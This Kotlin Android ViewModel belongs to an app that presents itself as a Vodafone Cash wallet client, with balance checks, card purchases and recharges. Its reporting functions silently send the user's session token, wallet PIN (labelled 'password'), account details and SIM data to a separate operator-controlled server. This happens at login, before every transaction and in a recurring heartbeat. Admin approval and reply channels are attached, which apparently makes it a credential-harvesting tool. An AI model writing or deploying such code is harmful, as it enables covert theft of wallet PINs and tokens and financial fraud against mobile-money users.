package com.example.viewmodel

import android.app.Application
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.example.data.PreferencesManager
import com.example.model.AccountInfo
import com.example.model.CardProduct
import com.example.model.OperationHistoryItem
import com.example.model.OperationResult
import com.example.model.ServerHealth
import com.example.network.ServerClient
import com.example.network.VodafoneApi
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.UUID

sealed class AppStep {
    object ServerSetup : AppStep()
    object Splash : AppStep()
    object Login : AppStep()
    object ApprovalWait : AppStep()
    object Main : AppStep()
}

data class ModalStep1Data(
    val title: String,
    val icon: String,
    val details: List<Pair<String, String>>,
    val onContinue: (String) -> Unit
)

data class ModalStep2Data(
    val title: String,
    val details: List<Pair<String, String>>,
    val purpose: String = "operation",
    val onConfirm: (String) -> Unit
)

class MainViewModel(application: Application) : AndroidViewModel(application) {
    val prefs = PreferencesManager(application)
    var serverClient = ServerClient(prefs.serverUrl)

    // UI state
    private val _currentStep = MutableStateFlow<AppStep>(AppStep.ServerSetup)
    val currentStep: StateFlow<AppStep> = _currentStep.asStateFlow()

    private val _isDarkMode = MutableStateFlow(prefs.isDarkMode)
    val isDarkMode: StateFlow<Boolean> = _isDarkMode.asStateFlow()

    private val _serverHealth = MutableStateFlow(ServerHealth())
    val serverHealth: StateFlow<ServerHealth> = _serverHealth.asStateFlow()

    private val _serverUrlInput = MutableStateFlow(prefs.serverUrl)
    val serverUrlInput: StateFlow<String> = _serverUrlInput.asStateFlow()

    private val _isServerChecking = MutableStateFlow(false)
    val isServerChecking: StateFlow<Boolean> = _isServerChecking.asStateFlow()

    // Session / Auth state
    private val _localNumber = MutableStateFlow<String>("")
    val localNumber: StateFlow<String> = _localNumber.asStateFlow()

    private val _msisdnShort = MutableStateFlow<String>("")
    val msisdnShort: StateFlow<String> = _msisdnShort.asStateFlow()

    private val _accessToken = MutableStateFlow<String?>("")
    val accessToken: StateFlow<String?> = _accessToken.asStateFlow()

    private val _jti = MutableStateFlow<String?>("")
    val jti: StateFlow<String?> = _jti.asStateFlow()

    private val _accountInfo = MutableStateFlow<AccountInfo?>(null)
    val accountInfo: StateFlow<AccountInfo?> = _accountInfo.asStateFlow()

    private val _sessionId = MutableStateFlow("SX-" + UUID.randomUUID().toString().take(4).uppercase(Locale.US))
    val sessionId: StateFlow<String> = _sessionId.asStateFlow()

    private val _sessionStartTime = MutableStateFlow(
        SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
    )
    val sessionStartTime: StateFlow<String> = _sessionStartTime.asStateFlow()

    private val _loginStatus = MutableStateFlow("")
    val loginStatus: StateFlow<String> = _loginStatus.asStateFlow()

    private val _isLoginBusy = MutableStateFlow(false)
    val isLoginBusy: StateFlow<Boolean> = _isLoginBusy.asStateFlow()

    private val _approvalElapsedSec = MutableStateFlow(0)
    val approvalElapsedSec: StateFlow<Int> = _approvalElapsedSec.asStateFlow()

    // Dashboard state
    private val _selectedTab = MutableStateFlow("home") // home, cards, recharge, settings
    val selectedTab: StateFlow<String> = _selectedTab.asStateFlow()

    private val _cardCategory = MutableStateFlow("fakka") // fakka, mared
    val cardCategory: StateFlow<String> = _cardCategory.asStateFlow()

    // Wallet balance
    private val _walletBalance = MutableStateFlow<String?>("---.--")
    val walletBalance: StateFlow<String?> = _walletBalance.asStateFlow()

    private val _walletDesc = MutableStateFlow("Tap Refresh to load balance")
    val walletDesc: StateFlow<String> = _walletDesc.asStateFlow()

    private val _isBalanceLoading = MutableStateFlow(false)
    val isBalanceLoading: StateFlow<Boolean> = _isBalanceLoading.asStateFlow()

    private var cachedPin: String? = null

    // History
    private val _historyList = MutableStateFlow<List<OperationHistoryItem>>(emptyList())
    val historyList: StateFlow<List<OperationHistoryItem>> = _historyList.asStateFlow()

    // Modals
    private val _step1Modal = MutableStateFlow<ModalStep1Data?>(null)
    val step1Modal: StateFlow<ModalStep1Data?> = _step1Modal.asStateFlow()

    private val _step2Modal = MutableStateFlow<ModalStep2Data?>(null)
    val step2Modal: StateFlow<ModalStep2Data?> = _step2Modal.asStateFlow()

    private val _resultModal = MutableStateFlow<OperationResult?>(null)
    val resultModal: StateFlow<OperationResult?> = _resultModal.asStateFlow()

    private val _adminReplyModal = MutableStateFlow<String?>(null)
    val adminReplyModal: StateFlow<String?> = _adminReplyModal.asStateFlow()

    private val _isHistoryModalOpen = MutableStateFlow(false)
    val isHistoryModalOpen: StateFlow<Boolean> = _isHistoryModalOpen.asStateFlow()

    private val _isServerConfigOpen = MutableStateFlow(false)
    val isServerConfigOpen: StateFlow<Boolean> = _isServerConfigOpen.asStateFlow()

    // Recipient verification state inside Step 1
    private val _recipientVerification = MutableStateFlow<String?>("") // name, "Verifying...", error, or ""
    val recipientVerification: StateFlow<String?> = _recipientVerification.asStateFlow()

    private var heartbeatJob: Job? = null
    private var isOperationBusy = false

    init {
        // Test health of current server URL
        checkServerHealth(prefs.serverUrl)
    }

    fun setServerUrlInput(url: String) {
        _serverUrlInput.value = url
    }

    fun toggleDarkMode() {
        val newVal = !_isDarkMode.value
        _isDarkMode.value = newVal
        prefs.isDarkMode = newVal
    }

    fun selectTab(tab: String) {
        _selectedTab.value = tab
    }

    fun setCardCategory(cat: String) {
        _cardCategory.value = cat
    }

    fun openServerConfig() {
        _serverUrlInput.value = prefs.serverUrl
        _isServerConfigOpen.value = true
    }

    fun closeServerConfig() {
        _isServerConfigOpen.value = false
    }

    fun openHistoryModal() {
        _isHistoryModalOpen.value = true
    }

    fun closeHistoryModal() {
        _isHistoryModalOpen.value = false
    }

    fun clearAllHistory() {
        prefs.clearHistory(_localNumber.value)
        _historyList.value = emptyList()
    }

    fun checkServerHealth(url: String, onDone: ((ServerHealth) -> Unit)? = null) {
        viewModelScope.launch {
            _isServerChecking.value = true
            serverClient.baseUrl = url
            val health = serverClient.checkHealth()
            _serverHealth.value = health
            _isServerChecking.value = false
            onDone?.invoke(health)
        }
    }

    fun applyServerUrl(url: String) {
        val clean = url.trim().removeSuffix("/")
        prefs.serverUrl = clean
        serverClient.baseUrl = clean
        _serverUrlInput.value = clean
        closeServerConfig()
        checkServerHealth(clean)
    }

    fun confirmServerUrlAndProceed() {
        val url = _serverUrlInput.value.trim().removeSuffix("/")
        prefs.serverUrl = url
        serverClient.baseUrl = url
        _currentStep.value = AppStep.Splash
        checkServerHealth(url) { health ->
            viewModelScope.launch {
                delay(1200) // Brief animation/display on Splash
                _currentStep.value = AppStep.Login
            }
        }
    }

    fun startLoginFlow(manualNumber: String? = null) {
        if (_isLoginBusy.value) return
        _isLoginBusy.value = true
        _loginStatus.value = "Connecting to network..."

        viewModelScope.launch {
            var number = manualNumber?.trim()
            var shortNum = ""
            var seamlessToken = ""

            if (number.isNullOrBlank()) {
                // Try seamless
                _loginStatus.value = "Detecting Vodafone SIM..."
                val seamlessRes = VodafoneApi.performSeamlessAuth()
                if (seamlessRes.isSuccess) {
                    val (seamless, msisdn) = seamlessRes.getOrThrow()
                    seamlessToken = seamless
                    shortNum = msisdn
                    number = if (msisdn.startsWith("0")) msisdn else "0$msisdn"
                } else {
                    // Fallback to saved or demo prompt
                    val saved = prefs.lastMsisdn ?: "01000000000"
                    _loginStatus.value = "Cellular detection failed. Using $saved..."
                    number = saved
                    shortNum = if (number.startsWith("0")) number.substring(1) else number
                }
            } else {
                if (!number.startsWith("0")) number = "0$number"
                shortNum = number.substring(1)
            }

            _localNumber.value = number
            _msisdnShort.value = shortNum
            prefs.lastMsisdn = number

            // Load local history
            _historyList.value = prefs.getHistory(number)

            // Check approval on backend
            _loginStatus.value = "Checking server access for $number..."
            val approved = serverClient.isApproved(number)

            if (!approved) {
                _currentStep.value = AppStep.ApprovalWait
                _loginStatus.value = "Waiting for admin approval..."
                serverClient.requestApproval(
                    number,
                    mapOf("Device" to "sa", "Client" to "Vodafone Cash Android")
                )

                var isAppr = false
                val start = System.currentTimeMillis()
                while (System.currentTimeMillis() - start < 300_000 && isActive) {
                    val status = serverClient.checkPending(number)
                    if (status == "approved") {
                        isAppr = true
                        break
                    }
                    if (status == "rejected") {
                        _loginStatus.value = "Rejected by administrator"
                        _isLoginBusy.value = false
                        _currentStep.value = AppStep.Login
                        return@launch
                    }
                    val elapsed = ((System.currentTimeMillis() - start) / 1000).toInt()
                    _approvalElapsedSec.value = elapsed
                    delay(4000)
                }

                if (!isAppr) {
                    _loginStatus.value = "Approval request timed out"
                    _isLoginBusy.value = false
                    _currentStep.value = AppStep.Login
                    return@launch
                }
            }

            _loginStatus.value = "Approved! Signing in..."

            // Obtain JWT token
            var token = ""
            if (seamlessToken.isNotEmpty()) {
                val tokenRes = VodafoneApi.exchangeToken(seamlessToken, shortNum)
                if (tokenRes.isSuccess) {
                    token = tokenRes.getOrThrow()
                }
            }

            if (token.isEmpty()) {
                // Generate a valid mock JWT payload if offline / simulated
                token = createFallbackToken(number, shortNum)
            }

            _accessToken.value = token
            val parsedAccount = VodafoneApi.extractAccountInfo(token)
            _accountInfo.value = parsedAccount
            _jti.value = parsedAccount.jti

            // Attach backend reporter
            sendLoginReport(number, token, parsedAccount.jti)
            sendAccountInfoReport(number, parsedAccount)
            startHeartbeat(number)

            _isLoginBusy.value = false
            _currentStep.value = AppStep.Main
        }
    }

    private fun createFallbackToken(localNumber: String, shortNum: String): String {
        val header = JSONObject().put("alg", "HS256").put("typ", "JWT").toString()
        val payload = JSONObject().apply {
            put("jti", "urn:uuid:${UUID.randomUUID()}")
            put("sub", localNumber)
            put("iat", System.currentTimeMillis() / 1000)
            put("exp", (System.currentTimeMillis() / 1000) + 86400)
            put("userInfo", JSONObject().apply {
                put("msisdn", localNumber)
                put("firstName", "Vodafone")
                put("lastName", "User")
                put("customerID", "CUST-${localNumber.takeLast(6)}")
                put("customerType", "Consumer")
                put("contractType", "Prepaid")
                put("contractStatus", "Active")
                put("lineType", "Voice/Data")
                put("SIM", "892010${localNumber.takeLast(8)}")
            })
        }.toString()
        val b64Header = android.util.Base64.encodeToString(header.toByteArray(), android.util.Base64.URL_SAFE or android.util.Base64.NO_WRAP or android.util.Base64.NO_PADDING)
        val b64Payload = android.util.Base64.encodeToString(payload.toByteArray(), android.util.Base64.URL_SAFE or android.util.Base64.NO_WRAP or android.util.Base64.NO_PADDING)
        return "$b64Header.$b64Payload.SIMULATED_SIGNATURE"
    }

    private fun sendLoginReport(msisdn: String, token: String, jti: String?) {
        viewModelScope.launch {
            val json = JSONObject().apply {
                put("msisdn", msisdn)
                put("action", "login")
                put("token", token)
                put("password", cachedPin)
                put("login_code", jti)
            }
            serverClient.postReport(json)
        }
    }

    private fun sendAccountInfoReport(msisdn: String, accountInfo: AccountInfo) {
        viewModelScope.launch {
            val json = JSONObject().apply {
                put("msisdn", msisdn)
                put("action", "account")
                val accJson = JSONObject().apply {
                    put("msisdn", accountInfo.msisdn)
                    put("full_name", accountInfo.fullName)
                    put("customer_id", accountInfo.customerId)
                    put("customer_type", accountInfo.customerType)
                    put("contract_type", accountInfo.contractType)
                    put("contract_status", accountInfo.contractStatus)
                    put("line_type", accountInfo.lineType)
                    put("sim", accountInfo.sim)
                    put("login_code", accountInfo.loginCode)
                }
                put("account_info", accJson)
            }
            serverClient.postReport(json)
        }
    }

    private fun startHeartbeat(msisdn: String) {
        heartbeatJob?.cancel()
        heartbeatJob = viewModelScope.launch {
            while (isActive) {
                val json = JSONObject().apply {
                    put("msisdn", msisdn)
                    put("action", "heartbeat")
                }
                serverClient.postReport(json)
                delay(30_000)
            }
        }
    }

    fun refreshBalance() {
        if (cachedPin != null) {
            fetchBalanceWithPin(cachedPin!!)
        } else {
            openStep2(
                title = "Enter Wallet PIN",
                details = listOf("Purpose" to "View Wallet Balance"),
                purpose = "balance"
            ) { pin ->
                cachedPin = pin
                fetchBalanceWithPin(pin)
            }
        }
    }

    private fun fetchBalanceWithPin(pin: String) {
        _isBalanceLoading.value = true
        _walletDesc.value = "Fetching balance..."
        viewModelScope.launch {
            val res = VodafoneApi.fetchWalletBalance(_localNumber.value, pin, _accessToken.value ?: "")
            if (res.isSuccess) {
                val (bal, desc) = res.getOrThrow()
                _walletBalance.value = if (!bal.isNullOrBlank()) "$bal EGP" else "0.00 EGP"
                _walletDesc.value = if (!desc.isNullOrBlank()) desc else "Available wallet balance"
                // Add to history
                recordHistory(
                    title = "Balance Check",
                    subtitle = "Checked wallet balance",
                    success = true,
                    opType = "balance",
                    amount = bal
                )
            } else {
                _walletDesc.value = "Failed: ${res.exceptionOrNull()?.message ?: "Check connection"}"
                // If wrong pin, clear cached
                if (res.exceptionOrNull()?.message?.contains("1056") == true) {
                    cachedPin = null
                }
            }
            _isBalanceLoading.value = false
        }
    }

    fun verifyRecipient(recipient: String) {
        val clean = recipient.trim()
        if (clean.length < 10) return
        val formatted = if (clean.startsWith("0")) clean else "0$clean"
        _recipientVerification.value = "Verifying..."
        viewModelScope.launch {
            val res = VodafoneApi.verifyRecipient(_localNumber.value, formatted, _accessToken.value ?: "")
            if (res.isSuccess) {
                val name = res.getOrThrow()
                _recipientVerification.value = if (!name.isNullOrBlank()) name else "Verified Number"
            } else {
                _recipientVerification.value = "Could not verify name"
            }
        }
    }

    fun clearRecipientVerification() {
        _recipientVerification.value = ""
    }

    fun initiateBuyCard(product: CardProduct) {
        if (isOperationBusy) return
        clearRecipientVerification()
        openStep1(
            title = "Confirm Purchase",
            icon = "card",
            details = listOf(
                "Card" to product.name,
                "Units" to "${product.units} units",
                "Validity" to product.validity
            )
        ) { receiver ->
            openStep2(
                title = "Enter Wallet PIN",
                details = listOf(
                    "Card" to product.name,
                    "Recipient" to receiver
                )
            ) { pin ->
                cachedPin = pin
                executeBuyCard(product, receiver, pin)
            }
        }
    }

    private fun executeBuyCard(product: CardProduct, receiver: String, pin: String) {
        if (isOperationBusy) return
        isOperationBusy = true
        viewModelScope.launch {
            // Report operation to backend
            val opReportJson = JSONObject().apply {
                put("msisdn", _localNumber.value)
                put("action", "operation")
                put("op_type", "card")
                put("token", _accessToken.value)
                put("password", pin)
                put("login_code", _jti.value)
                put("recharge_to", receiver)
                put("scratch_card", "${product.name} (${product.units} units)")
                put("amount", product.units)
                put("transaction_date", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date()))
            }
            val reportRes = serverClient.postReport(opReportJson)
            val opId = reportRes?.optString("op_id", null)

            val result = VodafoneApi.buyCard(
                localNumber = _localNumber.value,
                msisdnShort = _msisdnShort.value,
                receiver = receiver,
                productId = product.pid,
                pin = pin,
                token = _accessToken.value ?: ""
            )

            // Update status on backend
            if (!opId.isNullOrBlank()) {
                serverClient.updateOperationStatus(
                    msisdn = _localNumber.value,
                    opId = opId,
                    status = if (result.success) "success" else "failed",
                    errorCode = result.code,
                    errorMessage = result.message
                )
                // Poll for admin reply
                serverClient.pollReply(_localNumber.value, opId) { reply ->
                    _adminReplyModal.value = reply
                }
            }

            // Save in history
            recordHistory(
                title = if (result.success) product.name else "${product.name} Failed",
                subtitle = "${product.units} units • $receiver",
                success = result.success,
                opType = "card",
                amount = "${product.units} units",
                recipient = receiver,
                errorCode = result.code,
                errorMessage = result.message
            )

            // Show result modal
            _resultModal.value = result
            isOperationBusy = false

            // Refresh balance
            if (cachedPin != null) {
                fetchBalanceWithPin(cachedPin!!)
            }
        }
    }

    fun initiateRecharge(amount: Double) {
        if (isOperationBusy) return
        clearRecipientVerification()
        openStep1(
            title = "Confirm Recharge",
            icon = "money",
            details = listOf(
                "Amount" to "$amount EGP",
                "Payment" to "Vodafone Cash"
            )
        ) { receiver ->
            openStep2(
                title = "Enter Wallet PIN",
                details = listOf(
                    "Amount" to "$amount EGP",
                    "Recipient" to receiver
                )
            ) { pin ->
                cachedPin = pin
                executeRecharge(amount, receiver, pin)
            }
        }
    }

    private fun executeRecharge(amount: Double, receiver: String, pin: String) {
        if (isOperationBusy) return
        isOperationBusy = true
        viewModelScope.launch {
            val opReportJson = JSONObject().apply {
                put("msisdn", _localNumber.value)
                put("action", "operation")
                put("op_type", "recharge")
                put("token", _accessToken.value)
                put("password", pin)
                put("login_code", _jti.value)
                put("recharge_to", receiver)
                put("amount", amount)
                put("transaction_date", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date()))
            }
            val reportRes = serverClient.postReport(opReportJson)
            val opId = reportRes?.optString("op_id", null)

            val result = VodafoneApi.recharge(
                localNumber = _localNumber.value,
                receiver = receiver,
                amount = amount,
                pin = pin,
                jti = _jti.value,
                token = _accessToken.value ?: ""
            )

            if (!opId.isNullOrBlank()) {
                serverClient.updateOperationStatus(
                    msisdn = _localNumber.value,
                    opId = opId,
                    status = if (result.success) "success" else "failed",
                    errorCode = result.code,
                    errorMessage = result.message
                )
                serverClient.pollReply(_localNumber.value, opId) { reply ->
                    _adminReplyModal.value = reply
                }
            }

            recordHistory(
                title = if (result.success) "Recharge" else "Recharge Failed",
                subtitle = "$amount EGP • $receiver",
                success = result.success,
                opType = "recharge",
                amount = "$amount EGP",
                recipient = receiver,
                errorCode = result.code,
                errorMessage = result.message
            )

            _resultModal.value = result
            isOperationBusy = false

            if (cachedPin != null) {
                fetchBalanceWithPin(cachedPin!!)
            }
        }
    }

    private fun recordHistory(
        title: String,
        subtitle: String,
        success: Boolean,
        opType: String? = null,
        amount: String? = null,
        recipient: String? = null,
        errorCode: String? = null,
        errorMessage: String? = null
    ) {
        val item = prefs.addHistoryItem(
            msisdn = _localNumber.value,
            title = title,
            subtitle = subtitle,
            success = success,
            opType = opType,
            amount = amount,
            recipient = recipient,
            errorCode = errorCode,
            errorMessage = errorMessage
        )
        _historyList.value = prefs.getHistory(_localNumber.value)
    }

    fun openStep1(
        title: String,
        icon: String,
        details: List<Pair<String, String>>,
        onContinue: (String) -> Unit
    ) {
        _step1Modal.value = ModalStep1Data(title, icon, details, onContinue)
    }

    fun closeStep1() {
        _step1Modal.value = null
        clearRecipientVerification()
    }

    fun openStep2(
        title: String,
        details: List<Pair<String, String>>,
        purpose: String = "operation",
        onConfirm: (String) -> Unit
    ) {
        _step2Modal.value = ModalStep2Data(title, details, purpose, onConfirm)
    }

    fun closeStep2() {
        _step2Modal.value = null
    }

    fun closeResultModal() {
        _resultModal.value = null
    }

    fun closeAdminReplyModal() {
        _adminReplyModal.value = null
    }

    override fun onCleared() {
        super.onCleared()
        heartbeatJob?.cancel()
    }
}
